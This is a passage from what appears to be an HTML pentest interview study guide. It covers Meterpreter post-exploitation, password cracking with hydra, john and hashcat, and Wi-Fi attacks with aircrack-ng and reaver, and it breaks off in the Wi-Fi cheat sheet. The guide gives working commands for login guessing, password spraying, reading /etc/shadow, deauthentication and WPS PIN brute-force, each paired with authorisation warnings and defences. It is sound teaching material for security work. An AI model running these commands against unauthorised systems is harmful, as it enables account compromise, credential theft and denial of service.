+<strong>Stabilise</strong>: <code>getuid</code>, <code>sysinfo</code>, <code>ps</code>, then <code>migrate</code> into a stable same-or-lower-privilege process so the session survives the exploited process dying (counter: EDR flags cross-process injection/migration; app allow-listing). <strong>Enumerate locally</strong>: OS build and patch level, running services, scheduled tasks, installed software, local users/groups, network config, AV/EDR present &mdash; via <code>post/multi/recon/local_exploit_suggester</code> and built-ins (counter: least functionality, patching removes the suggested privesc paths, logging of recon tooling). <strong>Privilege escalation</strong>: check for unquoted service paths, weak service permissions, <code>AlwaysInstallElevated</code>, token privileges, stored creds, DLL hijacking; try <code>getsystem</code> only knowing which technique it uses (counter: harden service ACLs, disable <code>AlwaysInstallElevated</code>, patch, credential hygiene, EDR detections for <code>getsystem</code>/named-pipe impersonation). <strong>Credentials</strong>: <code>hashdump</code>/LSASS access, DPAPI, browser/creds stores (counter: Credential Guard, LSA protection, no admin reuse, LAPS). <strong>Lateral movement / pivoting</strong>: <code>run autoroute</code> / <code>portfwd</code> to reach segments through this host &mdash; only to in-scope targets (counter: segmentation, no flat networks, egress filtering, monitoring east-west traffic). <strong>Discipline</strong>: stay in scope, don't touch production data, take screenshots/notes for the report, prefer non-destructive proof, and clean up (remove uploaded tools, migrated artefacts) &mdash; and get explicit sign-off before any persistence. The report's value is the chain plus the specific control that would have broken it at each step.</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>Design a program that continuously validates your organisation's defences against the exploitation techniques these tools represent, without a full pentest each time.</summary><div class="answer-box">
+<strong>Goal</strong>: know, on an ongoing basis, that patching, segmentation, WAF, DB privilege, EDR, and logging actually stop the standard attacks &mdash; "purple team as a service". <strong>Attack simulation</strong>: an automated <strong>breach-and-attack-simulation</strong> layer (open-source like Atomic Red Team / Caldera / Metasploit in a controlled harness, or a commercial BAS) that safely runs the technique catalogue mapped to MITRE ATT&amp;CK &mdash; port scans, known-CVE exploit attempts against representative lab clones, reverse-shell callbacks, credential dumping, lateral movement, and SQLi payloads against a deliberately vulnerable app instance and against staging copies of real apps. Run in <strong>staging/lab environments that mirror prod</strong>, plus carefully scoped, non-destructive checks in prod (e.g. "can a host in segment A open an outbound connection to the internet on a random high port?"). <strong>Validation, per control</strong>: (1) <em>Patch/vuln mgmt</em> &mdash; run <code>local_exploit_suggester</code>-style checks and authenticated vuln scans continuously; alert on any host where a weaponised CVE is exploitable; measure mean-time-to-remediate. (2) <em>Segmentation/egress</em> &mdash; automated connectivity matrix tests from each segment (can B reach C? can anything egress to arbitrary ports/hosts?) and reverse-shell callback tests; fail if a callback succeeds from a server segment. (3) <em>WAF/SQLi</em> &mdash; a battery of sqlmap runs and manual payloads against staging apps with the WAF in blocking mode; track detection/block rate and false negatives; and independently verify the code uses parameterised queries (SAST, grep for string-built SQL) and that DB accounts are least-privilege (no <code>FILE</code>/DBA) &mdash; because the WAF is not the fix. (4) <em>EDR/detection</em> &mdash; run Meterpreter, <code>getsystem</code>, LSASS access, credential dumping, migration, persistence in the lab and confirm each generates a high-fidelity alert within SLA; feed gaps to detection engineering as new rules; re-test. (5) <em>Logging/SIEM</em> &mdash; confirm every simulated action produced the expected log and reached the SIEM (no silent gaps). <strong>Coverage &amp; scoring</strong>: a dashboard of ATT&amp;CK techniques vs "prevented / detected / neither", trended over time, with owners for each gap. Tie results to change management so a firewall or GPO change that regresses a control is caught by the next run. <strong>Safety</strong>: only safe/idempotent techniques in prod; destructive ones (real exploits, DoS) in lab only; a kill switch; clear allow-lists; SOC notified so it's a drill not an incident (but still measure their response). <strong>Cadence</strong>: continuous for connectivity/EDR/logging smoke tests; weekly for the SQLi/WAF battery; monthly for the fuller technique catalogue; annual human pentest for the creative attacks automation misses. <strong>Outputs</strong>: a living "are we exploitable via the obvious paths" scorecard, detection-engineering backlog, and evidence for auditors &mdash; and every new critical CVE triggers an ad-hoc "is this weaponisable against us and do we detect it" run. Net: BAS + connectivity tests + WAF/SQLi batteries + EDR/SIEM validation, mapped to ATT&amp;CK, run continuously against prod-like environments, with a trended prevented/detected scorecard and owned remediation.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:exploitation -->
+
+<!-- TOPIC:pentest:password-cracking -->
+<section class="view topic" id="v-pentest-password-cracking" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Password Cracking: hydra, john, hashcat</h1>
+<p class="subtitle">Two different jobs: <strong>hydra</strong> guesses logins against a live service; <strong>john</strong> and <strong>hashcat</strong> crack password hashes offline. Only against your own systems, a lab, a CTF, or hashes in an authorised engagement.</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 150" role="img" aria-labelledby="d-pt-crack-t">
+<title id="d-pt-crack-t">Online brute-force (hydra, network-bound) vs offline hash cracking (john/hashcat, compute-bound)</title>
+<rect class="d-box-alt" x="14" y="22" width="150" height="24" rx="6"/><text class="d-t-b" x="89" y="38" text-anchor="middle">ONLINE: hydra</text>
+<text class="d-t-sm" x="14" y="62">guesses vs a live service</text><text class="d-t-sm" x="14" y="78">limited by network + lockout</text><text class="d-t-sm" x="14" y="94">loud, logged, triggers alerts</text>
+<rect class="d-box-alt" x="290" y="22" width="150" height="24" rx="6"/><text class="d-t-b" x="365" y="38" text-anchor="middle">OFFLINE: john / hashcat</text>
+<text class="d-t-sm" x="290" y="62">you already have the hashes</text><text class="d-t-sm" x="290" y="78">limited by GPU + hash cost</text><text class="d-t-sm" x="290" y="94">silent &mdash; no target contact</text>
+<rect class="d-box" x="150" y="112" width="220" height="22" rx="4"/><text class="d-t-sm" x="260" y="127" text-anchor="middle">defence: slow hash + salt + MFA + lockout + length</text>
+<defs><marker id="pt-crack-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+</svg>
+<figcaption>Interview framing: the offensive numbers ("hashcat does billions of NTLM/sec") exist to justify the defensive choices (bcrypt/argon2, long passphrases, MFA). Cracking is also core to DFIR and password-policy auditing.</figcaption>
+</figure>
+
+<h3>hydra &mdash; online login guessing</h3>
+<p><strong>What / why.</strong> A parallel network login cracker for SSH, FTP, HTTP(S) forms/basic-auth, RDP, SMB, SMTP, databases, and more. It's rate-limited by the network and by the target's lockout/throttling, and it's <em>noisy</em> &mdash; every attempt is a real auth event. Use small, targeted lists; a full wordlist online is slow and gets you blocked.</p>
+<pre>$ hydra -l admin -P rockyou.txt ssh://10.10.10.7 -t 4          # one user, a wordlist, 4 threads
+$ hydra -L users.txt -p 'Winter2025!' 10.10.10.7 smb          # password spray: one pw, many users
+$ hydra -L users.txt -P pass.txt -u -f ftp://10.10.10.7       # -u loop users outer, -f stop on first hit
+
+# HTTP POST form - you must supply the request template and a failure string:
+$ hydra -l admin -P pass.txt 10.10.10.7 http-post-form \
+  "/login:user=^USER^&amp;pass=^PASS^:Invalid credentials" -t 8
+
+# key flags: -t threads (keep low), -w wait, -f stop on success, -o out.txt,
+#            -e nsr (also try null / user-as-pass / reversed), -s port, -S (SSL), -V verbose
+# password SPRAYING (one/few passwords across many accounts, slowly) beats brute-forcing one
+# account - it stays under lockout thresholds. Respect the account-lockout policy or you cause a DoS.</pre>
+
+<h3>john the ripper &mdash; offline, auto-detecting</h3>
+<p><strong>What / why.</strong> Cracks password hashes you already possess (from an authorised assessment, a lab, DFIR, or your own <code>/etc/shadow</code>). John auto-detects many hash formats, ships <code>*2john</code> helpers to extract hashes from files (ZIP, PDF, SSH keys, KeePass, kerberos), and has a strong default "single + wordlist + incremental" pipeline. Jumbo build has the widest format support.</p>
+<pre>$ unshadow /etc/passwd /etc/shadow &gt; mine.hash        # your own box
+$ ssh2john id_rsa &gt; key.hash ; zip2john secret.zip &gt; zip.hash ; keepass2john db.kdbx &gt; kp.hash
+
+$ john --wordlist=rockyou.txt --rules=Jumbo mine.hash     # wordlist + mangling rules
+$ john --format=nt hashes.txt --wordlist=rockyou.txt      # force a format if detection is ambiguous
+$ john --incremental mine.hash                            # brute-force by charset/length model
+$ john --show mine.hash                                   # print cracked results
+$ john --list=formats | tr ',' '\n' | grep -i sha         # what it supports
+
+# john stores progress in ~/.john/john.pot ; Ctrl-C then re-run resumes.
+# --fork=8 for multi-core CPU; hashcat is the tool once a GPU is involved.</pre>
+
+<h3>hashcat &mdash; GPU-accelerated, mode-driven</h3>
+<p><strong>What / why.</strong> The fastest cracker, built for GPUs. You specify the <strong>hash mode</strong> (<code>-m</code>) and the <strong>attack mode</strong> (<code>-a</code>). Its power is <em>rules</em> (word-mangling) and <em>masks</em> (targeted brute-force by position), which turn a wordlist into millions of realistic candidates cheaply.</p>
+<pre>$ hashcat -m 1000 hashes.txt rockyou.txt                      # -m 1000 = NTLM, straight wordlist
+$ hashcat -m 22000 wifi.hc22000 -a 0 wordlist.txt -r rules/best64.rule   # WPA, wordlist + rules
+$ hashcat -m 0 md5.txt -a 3 '?u?l?l?l?l?d?d?d'                # -a 3 mask: Upper lower*4 digit*3
+$ hashcat -m 3200 bcrypt.txt rockyou.txt                      # bcrypt: SLOW even on a GPU (that's the point)
+$ hashcat -m 1000 hashes.txt -a 6 wordlist.txt '?d?d?d?d'     # -a 6 = wordlist + mask suffix
+$ hashcat --show -m 1000 hashes.txt ; hashcat --restore       # results / resume a session
+
+# attack modes:  -a 0 straight  -a 1 combinator  -a 3 mask (brute)  -a 6 wl+mask  -a 7 mask+wl
+# common -m:  0 MD5 · 100 SHA1 · 1400 SHA-256 · 1000 NTLM · 1800 sha512crypt · 3200 bcrypt ·
+#             5600 NetNTLMv2 · 13100 Kerberoast(TGS) · 18200 AS-REP · 22000 WPA-PBKDF2 · 22921 (ssh)
+# --potfile-path, --session, --status --status-timer 10, -w 3 (workload), -O (optimized kernel)</pre>
+
+<h3>Wordlists, rules, and strategy</h3>
+<ul>
+<li><strong>Wordlists</strong>: <code>rockyou.txt</code> (the classic), SecLists, language- and target-specific lists, and lists built from OSINT (company name, products, seasons, <code>cewl</code> from the target's website). Bigger isn't better &mdash; a good rule set on a medium list beats a giant raw list.</li>
+<li><strong>Rules</strong> (hashcat <code>best64</code>, <code>OneRuleToRuleThemAll</code>, dive; john Jumbo/KoreLogic): append digits/symbols, capitalise, leetspeak, year suffixes &mdash; model how humans mutate a base word.</li>
+<li><strong>Masks</strong>: when you know the policy (e.g. "8 chars, 1 upper, 1 digit"), a mask brute-forces exactly that space &mdash; far smaller than full brute-force.</li>
+<li><strong>Order</strong>: fast/cheap first &mdash; small targeted wordlist &rarr; wordlist + rules &rarr; masks for the known policy &rarr; combinator &rarr; big list + heavy rules. Stop when the RoE's time box is up.</li>
+<li><strong>Fast vs slow hashes</strong>: MD5/NTLM/SHA1 fall to billions/sec on a GPU; <strong>bcrypt/scrypt/argon2/PBKDF2</strong> are deliberately slow (thousands/sec) &mdash; that's the whole point of a KDF.</li>
+</ul>
+
+<h3>The defensive payoff</h3>
+<ul>
+<li><strong>Store passwords with a slow, salted KDF</strong>: argon2id (preferred), scrypt, or bcrypt &mdash; never MD5/SHA-1/unsalted SHA-256. Per-user salt defeats rainbow tables; the work factor defeats GPU throughput.</li>
+<li><strong>Length beats complexity</strong>: a 4-word passphrase resists cracking far better than <code>P@ssw0rd1</code>; enforce a minimum length, screen against breach lists (HIBP), drop forced periodic rotation.</li>
+<li><strong>MFA</strong> makes a cracked password insufficient on its own &mdash; the highest-leverage control.</li>
+<li><strong>Lockout / throttling / spray detection</strong> defeats hydra: progressive delays, temporary lockout, alert on one source hitting many accounts or many failures across the tenant, and on off-hours auth spikes.</li>
+<li><strong>Windows-specific</strong>: kill NTLM where possible, use long <code>krbtgt</code>/service-account passwords or gMSA (defeats Kerberoasting), enable pre-auth (defeats AS-REP roasting), Credential Guard, and LAPS for local admin.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li><strong>hydra</strong> = online, vs a live service; network- and lockout-bound; loud. <code>hydra -l/-L user -p/-P pass &lt;proto&gt;://host -t 4 -f -o out</code>; HTTP needs the form template + failure string. Prefer <strong>spraying</strong> (1 pw &times; many users, slow) over brute-forcing one account.</li>
+<li><strong>john</strong> = offline, auto-detect; <code>*2john</code> extractors (ssh2john, zip2john, keepass2john); <code>john --wordlist=… --rules=…</code>, <code>--incremental</code>, <code>--show</code>; resumes from <code>~/.john/john.pot</code>; <code>--fork</code> for CPU.</li>
+<li><strong>hashcat</strong> = offline, GPU; pick <code>-m</code> (hash mode) and <code>-a</code> (0 straight / 1 combinator / 3 mask / 6 wl+mask). Rules (<code>-r best64.rule</code>) and masks (<code>?u?l?d?s</code>) multiply a wordlist. <code>--show</code>, <code>--restore</code>, <code>--session</code>.</li>
+<li>Common <code>-m</code>: 0 MD5, 100 SHA1, 1000 NTLM, 1400 SHA-256, 1800 sha512crypt, 3200 bcrypt, 5600 NetNTLMv2, 13100 Kerberoast, 22000 WPA.</li>
+<li>Strategy: targeted list &rarr; list+rules &rarr; policy mask &rarr; combinator &rarr; big list + heavy rules; stop at the time box.</li>
+<li>Fast hashes (MD5/NTLM/SHA1) = billions/sec; slow KDFs (argon2/bcrypt/scrypt/PBKDF2) = thousands/sec by design.</li>
+<li>Defence: argon2id/bcrypt + per-user salt + work factor; long passphrases + breach-list screening; <strong>MFA</strong>; lockout/throttle + spray detection; kill NTLM, gMSA, Kerberos pre-auth.</li>
+<li>Only crack hashes / attempt logins you're authorised to (own systems, lab, CTF, signed engagement).</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>hydra vs hashcat &mdash; what's the fundamental difference?</dt>
+<dd><strong>hydra</strong> does <em>online</em> attacks: it sends real login attempts to a running service, so it's limited by network latency, the service's rate-limiting, and account lockout &mdash; and every attempt is logged and alertable. <strong>hashcat</strong> (and john) do <em>offline</em> attacks: you already have the password hashes and you compute guesses locally against them, limited only by your GPU/CPU and the hash's cost &mdash; the target never knows. Online = few, careful, targeted guesses; offline = billions of guesses, silent.</dd>
+<dt>Why is password <em>spraying</em> preferred over brute-forcing a single account?</dt>
+<dd>Brute-forcing one account with a wordlist trips the lockout policy in a few tries (and locks the user out &mdash; a DoS you didn't authorise). Spraying flips it: try <em>one</em> plausible password (e.g. <code>Season+Year!</code>) across <em>many</em> accounts, slowly, then wait out the lockout window before the next password. Each account sees only 1&ndash;2 failures per window, staying under the threshold, while you still get broad coverage &mdash; large orgs almost always have someone using the obvious password. Defensively, this is why you alert on "one source, many accounts, few failures each" and on tenant-wide failure spikes, not just per-account counts.</dd>
+<dt>You have NTLM hashes and bcrypt hashes from a lab. Which crack faster and why does that matter?</dt>
+<dd>NTLM is a single unsalted MD4 &mdash; a modern GPU does tens of billions per second, so weak/medium NTLM passwords fall in seconds to hours. bcrypt is a deliberately slow, salted KDF with a tunable work factor &mdash; even a GPU rig manages only thousands to tens of thousands per second, and the per-user salt means you must attack each hash separately. The lesson for defenders: the hash algorithm is a security control. Never store passwords as NTLM/MD5/SHA-1/unsalted-SHA-256; use argon2id/bcrypt/scrypt with an appropriate cost so offline cracking is economically infeasible for anything but the worst passwords.</dd>
+<dt>What do "rules" and "masks" do in hashcat, and when do you use each?</dt>
+<dd><strong>Rules</strong> mutate each wordlist entry the way humans do &mdash; capitalise, append <code>123</code>/<code>!</code>/a year, leetspeak (<code>a&rarr;@</code>) &mdash; so a 10M-word list becomes billions of realistic candidates. Use rules when you have a decent base wordlist (real leaked passwords, OSINT terms). <strong>Masks</strong> brute-force a defined pattern by character position (<code>?u?l?l?l?l?d?d?d?d</code> = Upper + 4 lower + 4 digits). Use masks when you <em>know the password policy or structure</em> (min length, required character classes, a known prefix like a product name) &mdash; it searches exactly that space, which is vastly smaller than unconstrained brute-force. Often combined: <code>-a 6</code> (wordlist + mask suffix) for "dictionary word followed by a 4-digit year".</dd>
+<dt>Cracking is silent, so how would a defender ever know password hashes were stolen and are being cracked offline?</dt>
+<dd>You can't detect the cracking itself &mdash; it happens on the attacker's hardware. You detect the <em>theft</em> and the <em>use</em>: alert on abnormal access to hash stores (LSASS reads, <code>ntds.dit</code>/<code>/etc/shadow</code> copy, DB dumps of the users table, volume-shadow-copy abuse); assume any exfiltrated hash store is compromised and force a reset of everything in it, immediately, with a KDF/work-factor upgrade if needed; and detect the <em>result</em> &mdash; a previously-unseen credential suddenly working, logins from new locations/devices, impossible travel, use of a service account interactively. MFA blunts the payoff. So the strategy is: protect and monitor the hash stores, respond to exfiltration by mass-rotating, and rely on MFA + anomaly detection to catch a cracked password being used.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>Which tool here works without ever contacting the target system?</summary><div class="answer-box">
+<code>john</code> and <code>hashcat</code> &mdash; they crack hashes you already hold, entirely offline. <code>hydra</code> is online: it sends login attempts to a live service.
+</div></details>
+<details class="answer-reveal"><summary>In hashcat, what do <code>-m</code> and <code>-a</code> specify?</summary><div class="answer-box">
+<code>-m</code> is the hash mode (which algorithm/format the hashes are, e.g. <code>1000</code> = NTLM, <code>3200</code> = bcrypt). <code>-a</code> is the attack mode (<code>0</code> straight wordlist, <code>3</code> mask/brute-force, <code>6</code> wordlist+mask, etc.).
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>You're authorised to test password strength for a 5,000-user org and you've obtained the NTLM hashes. Design the cracking approach and what you report.</summary><div class="answer-box">
+<strong>Setup</strong>: work offline on the hashes only (never online against the DC); document chain of custody; time-box per the RoE. <strong>Attack ladder</strong> (fast/cheap first, hashcat <code>-m 1000</code>): (1) known-breach lists (HIBP NTLM, rockyou) straight; (2) same lists + a strong rule set (best64, then OneRuleToRuleThemAll); (3) <strong>OSINT-tuned list</strong> &mdash; company name, product names, city, sports teams, "Season+Year!" patterns, <code>cewl</code> from the corp site &mdash; with rules; (4) <strong>policy masks</strong> reflecting the AD password policy (e.g. <code>?u?l?l?l?l?l?d?d!</code> variants); (5) combinator of two short lists; (6) heavier masks up to a sane length. Stop at the time box. <strong>Analysis</strong>: crack rate overall and by group (privileged accounts, service accounts, execs); count of passwords that are: reused across accounts, matching the company/season pattern, on a breach list, shorter than policy would suggest is safe, or identical to the username. Identify any <strong>privileged</strong> accounts cracked (report those urgently and privately). Check for password reuse between admin and standard accounts of the same person. <strong>Report</strong> (no plaintext passwords in the deliverable &mdash; stats, patterns, and the specific risky accounts by identifier): headline crack percentage, the dominant weak patterns, privileged exposure, and concrete fixes &mdash; enforce longer minimums / passphrases, deploy a breach-password filter (Azure AD Password Protection / on-prem equivalent), ban company/season patterns, require MFA everywhere (especially privileged), move service accounts to gMSA, and re-test after remediation. Emphasise that a 30% crack rate isn't "users are dumb" &mdash; it's "the policy and stored-hash choices allow it."</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>Given how fast modern offline cracking is, design an authentication credential-storage and monitoring strategy that stays safe even if the hash store is stolen.</summary><div class="answer-box">
+<strong>Assume the hash file will leak</strong> and make that survivable. <strong>Hashing</strong>: <code>argon2id</code> as the primary KDF (memory-hard &mdash; defeats GPU/ASIC parallelism), tuned to the strongest parameters your latency budget allows (e.g. ~256&ndash;512 MB, iterations to hit ~250&ndash;500 ms server-side), with a unique per-user salt and a server-side <strong>pepper</strong>/secret key stored in an HSM/KMS (so a DB-only theft yields <em>uncrackable</em> hashes &mdash; the attacker also needs the HSM key). Support algorithm agility: store the algo + params with each hash and transparently upgrade on next login. bcrypt (cost &ge; 12) or scrypt are acceptable fallbacks; never fast hashes. <strong>Password policy</strong>: minimum length ~12&ndash;16 (favour passphrases), <em>no</em> composition rules or forced rotation (NIST 800-63B), block breach-corpus and context-specific words at set/reset time. <strong>MFA</strong>: mandatory, phishing-resistant (FIDO2/passkeys) for privileged and high-value; TOTP/push-with-number-matching minimum for everyone &mdash; so a cracked password alone is worthless. Prefer <strong>passwordless</strong> (passkeys) to remove the crackable secret entirely where possible. <strong>Rate control on the live service</strong>: per-account and per-source throttling with progressive delays, tenant-wide spray detection (one source &rarr; many accounts, low per-account failures), CAPTCHA/step-up on anomaly, and IP reputation &mdash; defeats hydra-style online attacks. <strong>Protect the store</strong>: least-privilege DB access (the app can't bulk-read the auth table; a separate hardened auth service owns it), encryption at rest with KMS, DLP/alerting on bulk reads of the credential table, on <code>ntds.dit</code>/<code>shadow</code>/LSASS access, and on volume-shadow-copy abuse. <strong>Detect misuse of a cracked credential</strong>: device binding, impossible-travel and new-ASN/new-device alerts, behavioural analytics, and honeytoken accounts whose any successful login is an incident. <strong>Incident readiness</strong>: a tested "credential store compromised" runbook &mdash; force reset of every affected credential, invalidate all sessions/refresh tokens, rotate the pepper (which instantly invalidates offline cracking progress), bump KDF params, and require re-enrolment of MFA if that store was in scope. <strong>Metrics</strong>: % of logins passwordless/phishing-resistant MFA, KDF parameter currency, time-to-rotate on incident, and offline-crack resistance estimated against a defined attacker budget. Net: memory-hard KDF + HSM-held pepper so a stolen hash file is inert, passphrases + breach screening, phishing-resistant MFA (ideally passwordless), aggressive online rate control, tight access + exfil monitoring on the store, anomaly detection on credential use, and a rehearsed rotate-everything-including-the-pepper response.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:password-cracking -->
+
+<!-- TOPIC:pentest:wireless -->
+<section class="view topic" id="v-pentest-wireless" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Wi-Fi Security: aircrack-ng &amp; reaver</h1>
+<p class="subtitle">Assess the security of a wireless network <strong>you own or are authorised to test</strong>: put the card in monitor mode, capture the WPA handshake, and try to crack the passphrase offline &mdash; or test WPS with reaver.</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 155" role="img" aria-labelledby="d-pt-wifi-t">
+<title id="d-pt-wifi-t">Monitor mode, capture the 4-way handshake (optionally forced by a deauth), crack offline</title>
+<rect class="d-box-alt" x="10" y="20" width="120" height="20"/><text class="d-t-sm" x="18" y="34">1 monitor mode</text>
+<rect class="d-box-alt" x="10" y="44" width="120" height="20"/><text class="d-t-sm" x="18" y="58">2 airodump (scan)</text>
+<rect class="d-box-alt" x="10" y="68" width="120" height="20"/><text class="d-t-sm" x="18" y="82">3 deauth &rarr; handshake</text>
+<rect class="d-box-alt" x="10" y="92" width="120" height="20"/><text class="d-t-sm" x="18" y="106">4 aircrack (offline)</text>
+<rect class="d-box-soft" x="180" y="55" width="140" height="24" rx="6"/><text class="d-t-b" x="250" y="71" text-anchor="middle">.cap / hc22000</text>
+<rect class="d-box" x="360" y="24" width="150" height="18"/><text class="d-t-sm" x="368" y="37">WPA/WPA2-PSK: dict attack</text>
+<rect class="d-box" x="360" y="46" width="150" height="18"/><text class="d-t-sm" x="368" y="59">WPS pin: reaver / bully</text>
+<rect class="d-box" x="360" y="68" width="150" height="18"/><text class="d-t-sm" x="368" y="81">WPA3-SAE: not dict-crackable</text>
+<path class="d-line" d="M130 78 L178 70" marker-end="url(#pt-wifi-ah)"/>
+<defs><marker id="pt-wifi-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+<text class="d-t-sm" x="10" y="132">A <tspan class="d-t-b">deauth</tspan> frame is a targeted denial of service &mdash; it knocks clients off. Only do it on a network you're authorised to test.</text>
+<text class="d-t-sm" x="10" y="150">The crack itself is offline: success depends entirely on the passphrase vs your wordlist. Long passphrase &rarr; safe.</text>
+</svg>
+<figcaption>Legality note: capturing/deauthing other people's Wi-Fi is illegal in most jurisdictions. This is for your own AP, a lab with your own hardware, or a written engagement. WPA3 and disabled WPS make almost all of this moot.</figcaption>
+</figure>
+
+<h3>Monitor mode and scanning (aircrack-ng suite)</h3>
+<p><strong>What / why.</strong> A normal Wi-Fi card only hears frames addressed to it. <strong>Monitor mode</strong> makes it capture all 802.11 frames on a channel. <code>airmon-ng</code> sets it up; <code>airodump-ng</code> scans for APs and clients and writes a capture file.</p>
+<pre>$ sudo airmon-ng check kill                 # stop NetworkManager/wpa_supplicant that fight monitor mode
+$ sudo airmon-ng start wlan0               # -> wlan0mon (monitor interface)
+$ sudo airodump-ng wlan0mon                 # live list: BSSID, channel, ENC (WPA2/WPA3), ESSID, clients
+
+# focus on ONE authorised network and save the capture:
+$ sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
+#   watch the top-right: "WPA handshake: AA:BB:.." appears once a client (re)connects</pre>
+
+<h3>Forcing and capturing the WPA handshake</h3>
+<p><strong>What / why.</strong> WPA/WPA2-PSK cracking needs the 4-way handshake, which only happens when a client joins. You can wait, or send a <strong>deauthentication</strong> frame to bump an existing client so it reconnects and you catch the handshake. Deauth is a real DoS on those clients &mdash; authorised targets only.</p>
+<pre># in a second terminal, while airodump is capturing:
+$ sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+#   --deauth N  = send N bursts   -a = AP BSSID   -c = a specific client (omit -c = broadcast, noisier)
+
+$ aircrack-ng capture-01.cap               # verify: "1 handshake" for the BSSID
+# modern alternative: hcxdumptool + hcxpcapngtool to get a hashcat 22000 file, and PMKID capture
+$ hcxpcapngtool -o wifi.hc22000 capture-01.cap</pre>
+
+<h3>Cracking the passphrase (offline)</h3>
+<p><strong>What / why.</strong> With the handshake captured, the attack is a pure offline dictionary/mask attack against WPA's PBKDF2 &mdash; no more contact with the network. It succeeds only if the passphrase is in your wordlist (or matches your mask). WPA's KDF is slow-ish, so throughput is far below MD5/NTLM.</p>
+<pre>$ aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap     # CPU, simple
+$ hashcat -m 22000 wifi.hc22000 rockyou.txt -r rules/best64.rule     # GPU, rules
+$ hashcat -m 22000 wifi.hc22000 -a 3 '?d?d?d?d?d?d?d?d'              # if you know it's 8 digits (common ISP default)
+#   8-char minimum means pure brute-force of the full charset is infeasible; ISP default-pattern
+#   masks and human-passphrase wordlists are what actually work.</pre>
+
+<h3>reaver &mdash; the WPS route</h3>
+<p><strong>What / why.</strong> <strong>WPS</strong> (the "push button / 8-digit PIN" convenience feature) has a design flaw: the PIN is validated in two halves, cutting the space from 10<sup>8</sup> to ~11,000, and the last digit is a checksum &mdash; so an online PIN brute-force can recover the PIN (and then the WPA passphrase) in hours on a vulnerable router. Many routers added lockout/rate-limiting or disabled WPS; <strong>Pixie-Dust</strong> is an offline variant against routers with weak nonce generation.</p>
+<pre>$ sudo wash -i wlan0mon                     # list APs with WPS enabled and whether they're locked
+$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv          # online PIN brute-force
+$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv          # -K = Pixie-Dust (offline, if vulnerable)
+#   reaver options: -d delay, -l lock-delay, --no-nacks, -x on-fail-wait; 'bully' is an alternative.
+# reaver is an ONLINE attack on the AP - it's noisy, can lock WPS, and can be a DoS. Authorised only.</pre>
+
+<h3>Defence &mdash; and it's decisive</h3>
+<ul>
+<li><strong>Use a long, random passphrase</strong> (or WPA-Enterprise/802.1X with per-user creds). 20+ random characters, or a 5&ndash;6 word passphrase, is not in anyone's wordlist and infeasible to brute-force &mdash; the offline attack simply fails.</li>
+<li><strong>Move to WPA3</strong> (SAE / "Personal"): the Dragonfly handshake is resistant to offline dictionary attack &mdash; capturing it doesn't let you guess offline &mdash; and it adds forward secrecy. Use WPA3-only where clients allow, WPA3/WPA2 transitional otherwise (aware transitional mode still exposes a WPA2 handshake).</li>
+<li><strong>Disable WPS entirely</strong> &mdash; kills reaver/Pixie-Dust. If a router won't let you, replace it.</li>
+<li><strong>Segment the WLAN</strong>: guest SSID isolated from the corporate LAN, client isolation on, management interfaces not reachable from Wi-Fi.</li>
+<li><strong>Detect</strong>: a WIDS/WIPS (or even <code>airodump</code> on a sensor) flags deauth floods, rogue/evil-twin APs, and WPS brute-force patterns; alert on them.</li>
+<li><strong>Hardware/regulatory</strong>: many jurisdictions treat deauth/jamming as illegal even on your own gear in shared spectrum &mdash; know the local rules; test in an RF-isolated lab if unsure.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li>Legality: your own AP / your own lab hardware / written engagement only. Deauth = a real DoS on clients.</li>
+<li><strong>Monitor mode</strong>: <code>airmon-ng check kill</code> &rarr; <code>airmon-ng start wlan0</code> (&rarr; <code>wlan0mon</code>).</li>
+<li><strong>Scan / capture</strong>: <code>airodump-ng wlan0mon</code>; focus: <code>airodump-ng --bssid &lt;AP&gt; -c &lt;ch&gt; -w capture wlan0mon</code>; wait for "WPA handshake".</li>
+<li><strong>Force handshake</strong>: <code>aireplay-ng --deauth 3 -a &lt;AP&gt; -c &lt;client&gt; wlan0mon</code> (broadcast if no <code>-c</code>, noisier).</li>
+<li><strong>Crack (offline)</strong>: <code>aircrack-ng -w list -b &lt;AP&gt; capture-01.cap</code>, or <code>hashcat -m 22000 wifi.hc22000 list -r rules</code>. Also PMKID via <code>hcxdumptool</code>/<code>hcxpcapngtool</code>.</li>
